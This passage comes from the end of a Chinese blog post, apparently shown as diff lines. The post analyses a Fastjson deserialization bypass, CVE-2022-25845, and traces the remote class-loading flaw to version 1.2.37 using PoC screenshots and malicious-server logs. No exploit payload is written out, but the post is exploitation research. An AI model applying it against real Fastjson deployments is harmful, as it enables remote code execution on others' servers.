+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608261902454.png" alt="image-20260826190252322"></p>
+<p>测试过后也确实可以触发我们的poc</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608262014102.png" alt="image-20260826201439494"></p>
+<p>但是，真的只是这么容易吗</p>
+<h4 id="2-3、补丁1-2-37"><a href="#2-3、补丁1-2-37" class="headerlink" title="2.3、补丁1.2.37"></a>2.3、补丁1.2.37</h4><p>之前的研究发现，重要的远程类加载逻辑本质上就是</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这一块内部的<code>LaunchedURLClassLoader#loadClass</code>发起远程类加载，所以没必要前面的探测，如果可以直接进行调用上面的代码接着返回类，poc直接联通</p>
+<p>同时，在<code>fastjson1.2.37</code>时，也是<code>JSONType</code>这个sink第一次出现</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/alibaba/fastjson/compare/1.2.36...1.2.37</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608261933092.png" alt="image-20260826193350704"></p>
+<p>然后这一块的绕过逻辑就是这样</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608261940716.png" alt="image-20260826194006358"></p>
+<p>同时，只是直接进行类加载的话，那目标端对攻击端的探测也只会存在一次，复现成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608262006552.png" alt="image-20260826200641075"></p>
+<p>同时，恶意服务器记录也和预期相同</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608261952201.png" alt="image-20260826195223636"></p>
+<p>对于<code>fastjson1.2.36</code></p>
+<p>因为没有绕过逻辑，复现不成功，抛出异常</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202608262009211.png" alt="image-20260826200934511"></p>
+<p>所以一顿追溯，找到了恶意逻辑引入的最开始的地方，也就是<code>CVE-2022-25845</code>最小影响到的版本是<code>fastjson1.2.37</code></p>
+<p>总之，问题在<code>fastjson1.2.37</code>引入，随后<code>fastjson1.2.48</code>做出调整，就是先探测在加载类然后在<code>fastjson1.2.84</code>得到修复，对于<code>noneautotype</code>系列不影响</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://zc-18.github.io/">十七.</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://zc-18.github.io/2026/08/20/fastjson04/">https://zc-18.github.io/2026/08/20/fastjson04/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://zc-18.github.io/" target="_blank">十七.</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java%E5%AE%89%E5%85%A8/">java安全</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/FastJson/">FastJson</a></div><div class="post-share"><div class="social-share" data-image="/img/covers/cover-31.webp" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/08/02/fastjson03/" title="java安全-FastJson绕过汇总"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="/img/covers/cover-11.webp" onerror="onerror=null;src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">java安全-FastJson绕过汇总</div></div><div class="info-2"><div class="info-item-1">FastJson反序列化漏洞研究，这里汇总了常见版本的一些绕过方式，以及对应的修复补丁，涉及到官方收录或者未收录等多种绕过方式</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/07/02/fastjson02/" title="java安全-FastJson利用链"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="/img/covers/cover-40.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-02</div><div class="info-item-2">java安全-FastJson利用链</div></div><div class="info-2"><div class="info-item-1">FastJson反序列化漏洞研究，这里研究调用了社区中讨论最多的三条链，使用的未设置任何防护的1.2.24版本</div></div></div></a><a class="pagination-related" href="/2026/08/02/fastjson03/" title="java安全-FastJson绕过汇总"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="/img/covers/cover-11.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-08-02</div><div class="info-item-2">java安全-FastJson绕过汇总</div></div><div class="info-2"><div class="info-item-1">FastJson反序列化漏洞研究，这里汇总了常见版本的一些绕过方式，以及对应的修复补丁，涉及到官方收录或者未收录等多种绕过方式</div></div></div></a><a class="pagination-related" href="/2026/07/01/fastjson01/" title="java安全-FastJson流程分析"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202602101918538.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-07-01</div><div class="info-item-2">java安全-FastJson流程分析</div></div><div class="info-2"><div class="info-item-1">FastJson反序列化漏洞研究，这里先行研究该组件内部的具体实现逻辑</div></div></div></a><a class="pagination-related" href="/2025/12/13/fanxuliehau/" title="java安全-反序列化"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601010126234.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-13</div><div class="info-item-2">java安全-反序列化</div></div><div class="info-2"><div class="info-item-1">java安全中反序列化初识别部分，java的大部分漏洞都与他有关。</div></div></div></a><a class="pagination-related" href="/2026/01/15/CC1_plus-chain/" title="java安全-CC1进阶"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="/img/covers/cover-48.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-15</div><div class="info-item-2">java安全-CC1进阶</div></div><div class="info-2"><div class="info-item-1">java安全链中的CC1_plus，主要分析了官方ysoserial的LazyMap链，并且研究了jdk8u71版本后CC1失效的原因</div></div></div></a><a class="pagination-related" href="/2026/02/16/shiro_CB/" title="java安全-CB链"><img class="cover" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="/img/covers/cover-04.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-16</div><div class="info-item-2">java安全-CB链</div></div><div class="info-2"><div class="info-item-1">java安全中shiro反序列化漏洞，这里主要利用的是shiro自带依赖CommonsBeanutils链路反序列化漏洞</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan2.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="avatar"/></div><div class="author-info-name">十七.</div><div class="author-info-description">慢吞吞的小孩也会有自己的玫瑰海.</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">55</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zc-18/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/zc-18/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://blog.csdn.net/2401_87508420" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="mailto:2890792376@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#FastJson1-2-83%E7%BB%95%E8%BF%87"><span class="toc-text">FastJson1.2.83绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%BB%95%E8%BF%87"><span class="toc-text">一、绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%A4%8D%E7%8E%B0"><span class="toc-text">1.复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-text">2.黑名单绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1%E3%80%81%E8%8E%B7%E5%8F%96%E7%B1%BB%E5%90%8D"><span class="toc-text">2.1、获取类名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2%E3%80%81%E6%95%B0%E6%8D%AE%E6%B5%81%E8%BF%9B%E5%85%A5"><span class="toc-text">2.2、数据流进入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3%E3%80%81%E5%8C%85%E8%A3%85ClassReader"><span class="toc-text">2.3、包装ClassReader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4%E3%80%81%E5%8C%B9%E9%85%8D%E6%B3%A8%E8%A7%A3"><span class="toc-text">2.4、匹配注解</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%81%B6%E6%84%8F%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-text">3.恶意类加载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1%E3%80%81%E8%BF%9B%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD"><span class="toc-text">3.1、进入远程加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2%E3%80%81%E5%8F%91%E8%B5%B7%E5%A4%96%E9%83%A8%E8%AF%B7%E6%B1%82"><span class="toc-text">3.2、发起外部请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3%E3%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%87%E4%BB%B6"><span class="toc-text">3.3、加载字节码文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4%E3%80%81%E6%A0%88%E5%9B%BE"><span class="toc-text">3.4、栈图</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%81%B6%E6%84%8F%E7%B1%BB%E5%AE%9E%E4%BE%8B%E5%8C%96"><span class="toc-text">4.恶意类实例化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1%E3%80%81%E8%8E%B7%E5%8F%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%99%A8"><span class="toc-text">4.1、获取反序列化器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2%E3%80%81%E5%AE%9E%E4%BE%8B%E5%8C%96%E6%81%B6%E6%84%8F%E7%B1%BB"><span class="toc-text">4.2、实例化恶意类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%B8%80%E4%BA%9B%E9%A2%9D%E5%A4%96%E7%9A%84%E7%82%B9"><span class="toc-text">5.一些额外的点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1%E3%80%81%E5%8F%91%E8%B5%B7%E4%BF%A9%E6%AC%A1%E8%AF%B7%E6%B1%82"><span class="toc-text">5.1、发起俩次请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2%E3%80%81%E7%9B%AE%E6%A0%87%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">5.2、目标启动方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-3%E3%80%81%E9%BB%98%E8%AE%A4%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-text">5.3、默认类加载器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-4%E3%80%81%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BC%93%E5%AD%98"><span class="toc-text">5.4、目标服务器缓存</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%BC%95%E5%85%A5%E4%B8%8E%E4%BF%AE%E5%A4%8D"><span class="toc-text">二、引入与修复</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%AE%E5%A4%8D"><span class="toc-text">1.修复</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1%E3%80%81checkAutoType%E5%87%BD%E6%95%B0"><span class="toc-text">1.1、checkAutoType函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2%E3%80%81loadClass%E5%87%BD%E6%95%B0"><span class="toc-text">1.2、loadClass函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%97%AE%E9%A2%98%E7%9A%84%E5%BC%95%E5%85%A5"><span class="toc-text">2.问题的引入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1%E3%80%81%E8%A1%A5%E4%B8%811-2-68"><span class="toc-text">2.1、补丁1.2.68</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1%E3%80%81%E8%A1%A5%E4%B8%811-2-48"><span class="toc-text">2.1、补丁1.2.48</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3%E3%80%81%E8%A1%A5%E4%B8%811-2-37"><span class="toc-text">2.3、补丁1.2.37</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div class="claude-footer"><p class="claude-footer-slogan">浪有归处，风有信期，少年有山海。</p><div class="claude-footer-divider" aria-hidden="true"></div><div class="claude-footer-runtime" aria-label="本站运行时间"><span class="claude-footer-rt-label">本站已平稳运行</span><span class="claude-footer-rt-group"><span class="claude-footer-rt-num" id="footer-rt-d">0</span><span class="claude-footer-rt-unit">天</span></span><span class="claude-footer-rt-group"><span class="claude-footer-rt-num" id="footer-rt-h">00</span><span class="claude-footer-rt-unit">时</span></span><span class="claude-footer-rt-group"><span class="claude-footer-rt-num" id="footer-rt-m">00</span><span class="claude-footer-rt-unit">分</span></span><span class="claude-footer-rt-group"><span class="claude-footer-rt-num" id="footer-rt-s">00</span><span class="claude-footer-rt-unit">秒</span></span></div><div class="claude-footer-copyright"><span>©</span><span id="footer-year">2026</span><span>十七.</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3-b2"></script><script src="/js/main.js?v=5.5.3-b2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script defer src="/js/ai-assistant.js"></script><script defer src="/js/claude-pages.js"></script><script defer src="/js/claude-aside.js"></script><script defer src="/js/lib/gsap.min.js"></script><script defer src="/js/lib/ScrollTrigger.min.js"></script><script defer src="/js/lib/SplitText.min.js"></script><script defer src="/js/claude-motion.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索一下.." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.3-b2"></script></div></div></body></html>
